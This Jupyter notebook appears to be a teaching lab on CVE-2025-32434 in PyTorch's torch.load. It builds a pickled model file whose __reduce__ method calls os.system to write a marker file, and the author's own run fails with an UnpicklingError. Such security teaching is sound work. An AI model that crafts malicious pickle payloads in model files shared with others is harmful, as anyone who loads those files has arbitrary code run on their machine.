{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8e23041a",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6caa85f0",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(torch_load_CVE-2025-32434.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fa256425",
   "metadata": {},
   "source": [
    "### Exploiting Torch Load Vulnerability: CVE-2025-32434\n",
    "\n",
    "**Note** This vulnerability is real but it depends not only on your system running 2.5.1. For example, I was not able to exploit the vulnerability on my Surface but or on my laptop.  I think it ultimately has something to do with the system configuration. I did not look further into it.  \n",
    "\n",
    "Feel free to learn more about exploiting the vulnerability from here: https://www.cve.news/cve-2025-32434/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e592dbd0",
   "metadata": {},
   "source": [
    "In your Conda environment  \n",
    "\n",
    "To ensure we setup specifically for this attack, let us create a conda environment  \n",
    "\n",
    "$ **conda create --name=torch_load_2.5.1_vuln python=3.12 --yes**     \n",
    "\n",
    "Activate the conda environment \n",
    "$ **conda activate torch_load_2.5.1_vuln**   \n",
    "\n",
    "\n",
    "To ensure we can run our lab comfortable from Conda (Anaconda or MiniConda) let us install ipykernel     \n",
    "$ pip install ipykernel --verbose --no-cache-dir   \n",
    "\n",
    "Like we did in the envrionment_setup.ipynb site, select the Python kernel within VSCode. \n",
    "\n",
    "With that set, let us install the vulnerable version.  \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "5477476e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Using pip 25.1 from /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages/pip (python 3.12)\n",
      "  Link requires a different Python (3.12.11 not in: '>=3.7,<3.11'): https://files.pythonhosted.org/packages/3a/be/650f9c091ef71cb01d735775d554e068752d3ff63d7943b26316dc401749/numpy-1.21.2.zip (from https://pypi.org/simple/numpy/) (requires-python:>=3.7,<3.11)\n",
      "  Link requires a different Python (3.12.11 not in: '>=3.7,<3.11'): https://files.pythonhosted.org/packages/5f/d6/ad58ded26556eaeaa8c971e08b6466f17c4ac4d786cd3d800e26ce59cc01/numpy-1.21.3.zip (from https://pypi.org/simple/numpy/) (requires-python:>=3.7,<3.11)\n",
      "  Link requires a different Python (3.12.11 not in: '>=3.7,<3.11'): https://files.pythonhosted.org/packages/fb/48/b0708ebd7718a8933f0d3937513ef8ef2f4f04529f1f66ca86d873043921/numpy-1.21.4.zip (from https://pypi.org/simple/numpy/) (requires-python:>=3.7,<3.11)\n",
      "  Link requires a different Python (3.12.11 not in: '>=3.7,<3.11'): https://files.pythonhosted.org/packages/c2/a8/a924a09492bdfee8c2ec3094d0a13f2799800b4fdc9c890738aeeb12c72e/numpy-1.21.5.zip (from https://pypi.org/simple/numpy/) (requires-python:>=3.7,<3.11)\n",
      "  Link requires a different Python (3.12.11 not in: '>=3.7,<3.11'): https://files.pythonhosted.org/packages/45/b7/de7b8e67f2232c26af57c205aaad29fe17754f793404f59c8a730c7a191a/numpy-1.21.6.zip (from https://pypi.org/simple/numpy/) (requires-python:>=3.7,<3.11)\n",
      "Collecting numpy==2.2.0\n",
      "  Obtaining dependency information for numpy==2.2.0 from https://files.pythonhosted.org/packages/90/24/d0bbb56abdd8934f30384632e3c2ca1ebfeb5d17e150c6e366ba291de36b/numpy-2.2.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata\n",
      "  Downloading numpy-2.2.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (62 kB)\n",
      "Requirement already satisfied: torch==2.5.1 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (2.5.1)\n",
      "Requirement already satisfied: filelock in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (3.18.0)\n",
      "Requirement already satisfied: typing-extensions>=4.8.0 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (4.14.1)\n",
      "Requirement already satisfied: networkx in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (3.5)\n",
      "Requirement already satisfied: jinja2 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (3.1.6)\n",
      "Requirement already satisfied: fsspec in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (2025.5.1)\n",
      "Requirement already satisfied: nvidia-cuda-nvrtc-cu12==12.4.127 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.127)\n",
      "Requirement already satisfied: nvidia-cuda-runtime-cu12==12.4.127 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.127)\n",
      "Requirement already satisfied: nvidia-cuda-cupti-cu12==12.4.127 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.127)\n",
      "Requirement already satisfied: nvidia-cudnn-cu12==9.1.0.70 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (9.1.0.70)\n",
      "Requirement already satisfied: nvidia-cublas-cu12==12.4.5.8 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.5.8)\n",
      "Requirement already satisfied: nvidia-cufft-cu12==11.2.1.3 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (11.2.1.3)\n",
      "Requirement already satisfied: nvidia-curand-cu12==10.3.5.147 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (10.3.5.147)\n",
      "Requirement already satisfied: nvidia-cusolver-cu12==11.6.1.9 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (11.6.1.9)\n",
      "Requirement already satisfied: nvidia-cusparse-cu12==12.3.1.170 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.3.1.170)\n",
      "Requirement already satisfied: nvidia-nccl-cu12==2.21.5 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (2.21.5)\n",
      "Requirement already satisfied: nvidia-nvtx-cu12==12.4.127 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.127)\n",
      "Requirement already satisfied: nvidia-nvjitlink-cu12==12.4.127 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (12.4.127)\n",
      "Requirement already satisfied: triton==3.1.0 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (3.1.0)\n",
      "Requirement already satisfied: setuptools in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (78.1.1)\n",
      "Requirement already satisfied: sympy==1.13.1 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from torch==2.5.1) (1.13.1)\n",
      "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from sympy==1.13.1->torch==2.5.1) (1.3.0)\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages (from jinja2->torch==2.5.1) (3.0.2)\n",
      "Downloading numpy-2.2.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.1 MB)\n",
      "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m16.1/16.1 MB\u001b[0m \u001b[31m15.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0ma \u001b[36m0:00:01\u001b[0m\n",
      "\u001b[?25hInstalling collected packages: numpy\n",
      "  changing mode of /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/bin/f2py to 755\n",
      "  changing mode of /home/securitynik/miniconda3/envs/torch_load_2.5.1_vuln/bin/numpy-config to 755\n",
      "Successfully installed numpy-2.2.0\n"
     ]
    }
   ],
   "source": [
    "# Install the vulnerable version\n",
    "! pip install numpy==2.2.0 torch==2.5.1 --no-cache-dir --verbose   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "8d844bc1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let us import torch\n",
    "import torch\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "deca4747",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] Torch 2.5.1+cu124 is vulnerable to CVE-2025-32434\n"
     ]
    }
   ],
   "source": [
    "# Get the version of torch we are using\n",
    "# print(torch.__version__)\n",
    "\n",
    "if torch.__version__.__contains__('2.5.1'):\n",
    "    print(f'[!] Torch {torch.__version__} is vulnerable to CVE-2025-32434')\n",
    "else:\n",
    "    print(f'[*] No vulnerable version of torch found! {torch.__version__}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "7df1b59f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting the device to cuda\n"
     ]
    }
   ],
   "source": [
    "# Setup the device to work with\n",
    "# This should ensure if there are accelerators in place, such as Apple backend or CUDA, \n",
    "# we should be able to take advantage of it.\n",
    "\n",
    "if torch.cuda.is_available():\n",
    "    print('Setting the device to cuda')\n",
    "    device = 'cuda'\n",
    "elif torch.backends.mps.is_available():\n",
    "    print('Setting the device to Apple mps')\n",
    "    device = 'mps'\n",
    "else:\n",
    "    print('Setting the device to CPU')\n",
    "    device = torch.device('cpu')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "526ce826",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create a malicious model \n",
    "# This should/will look similar to the issue we deal with in the fickling section\n",
    "\n",
    "class MaliciousModel(object):\n",
    "    def __reduce__(self):\n",
    "        print(f'.__reduce__ triggered ')\n",
    "        return (os.system, ('echo YOU HAVE BEEN PAWNED! > /tmp/pwnd.txt', ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "7cd44c52",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([9., 8., 7.])"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Create a malicious tensor\n",
    "malicious_tensor = torch.tensor(data=[9., 8., 7.])\n",
    "malicious_tensor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "a1b2cecd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ".__reduce__ triggered \n"
     ]
    }
   ],
   "source": [
    "# Let us write our model to file\n",
    "with open(file=r'/tmp/malicious_model.pt', mode='wb') as f:\n",
    "    torch.save(obj={'weights': malicious_tensor, 'exploit' : MaliciousModel()}, f=f )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "cc7dfe92",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/malicious_model.pt\n"
     ]
    }
   ],
   "source": [
    "# Verify the file has been created\n",
    "!ls /tmp/malicious_model.pt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "ec3aafe2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loading model ...\n"
     ]
    },
    {
     "ename": "UnpicklingError",
     "evalue": "Weights only load failed. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nTrying to load unsupported GLOBAL posix.system whose module posix is blocked.\n\nCheck the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mUnpicklingError\u001b[39m                           Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[11]\u001b[39m\u001b[32m, line 3\u001b[39m\n\u001b[32m      1\u001b[39m \u001b[38;5;66;03m# With the model created, let us trigger the vulnerability \u001b[39;00m\n\u001b[32m      2\u001b[39m \u001b[38;5;28mprint\u001b[39m(\u001b[33mf\u001b[39m\u001b[33m'\u001b[39m\u001b[33mLoading model ...\u001b[39m\u001b[33m'\u001b[39m)\n\u001b[32m----> \u001b[39m\u001b[32m3\u001b[39m model = \u001b[43mtorch\u001b[49m\u001b[43m.\u001b[49m\u001b[43mload\u001b[49m\u001b[43m(\u001b[49m\u001b[43mf\u001b[49m\u001b[43m=\u001b[49m\u001b[33;43m'\u001b[39;49m\u001b[33;43m/tmp/malicious_model.pt\u001b[39;49m\u001b[33;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mweights_only\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mTrue\u001b[39;49;00m\u001b[43m)\u001b[49m\n\u001b[32m      4\u001b[39m model\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~/miniconda3/envs/torch_load_2.5.1_vuln/lib/python3.12/site-packages/torch/serialization.py:1359\u001b[39m, in \u001b[36mload\u001b[39m\u001b[34m(f, map_location, pickle_module, weights_only, mmap, **pickle_load_args)\u001b[39m\n\u001b[32m   1351\u001b[39m                 \u001b[38;5;28;01mreturn\u001b[39;00m _load(\n\u001b[32m   1352\u001b[39m                     opened_zipfile,\n\u001b[32m   1353\u001b[39m                     map_location,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1356\u001b[39m                     **pickle_load_args,\n\u001b[32m   1357\u001b[39m                 )\n\u001b[32m   1358\u001b[39m             \u001b[38;5;28;01mexcept\u001b[39;00m pickle.UnpicklingError \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[32m-> \u001b[39m\u001b[32m1359\u001b[39m                 \u001b[38;5;28;01mraise\u001b[39;00m pickle.UnpicklingError(_get_wo_message(\u001b[38;5;28mstr\u001b[39m(e))) \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m   1360\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m _load(\n\u001b[32m   1361\u001b[39m             opened_zipfile,\n\u001b[32m   1362\u001b[39m             map_location,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1365\u001b[39m             **pickle_load_args,\n\u001b[32m   1366\u001b[39m         )\n\u001b[32m   1367\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m mmap:\n",
      "\u001b[31mUnpicklingError\u001b[39m: Weights only load failed. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nTrying to load unsupported GLOBAL posix.system whose module posix is blocked.\n\nCheck the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html."
     ]
    }
   ],
   "source": [
    "# With the model created, let us trigger the vulnerability \n",
    "print(f'Loading model ...')\n",
    "model = torch.load(f='/tmp/malicious_model.pt', weights_only=True)\n",
    "model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6098542",
   "metadata": {},
   "source": [
    "In my case above it fails. If I set *weights_only=False* it works. However that is not what we want here. Maybe it is something with my system build. However, you can look further into it.  \n",
    "\n",
    "Realistically, I could have left this lab out. However, I don't wish for you to think all vulnerabilities are easily exploitable. Sometimes when they say a fix exists it does not as we will see in the TFServing lab. Similarly, for whatever strange reason, on this system, I am unable to exploit this vulnerability. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c984a145",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access '/tmp/pwnd.txt': No such file or directory\n"
     ]
    }
   ],
   "source": [
    "# Was the file created\n",
    "# In our case it did not because their was an error.  \n",
    "!ls /tmp/pwnd.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "41ce94fb",
   "metadata": {},
   "source": [
    "If everything works out, you should see the file created above.  \n",
    "\n",
    "Reference:  \n",
    "https://www.cve.news/cve-2025-32434/  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73cf4ffc",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "torch_vuln",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
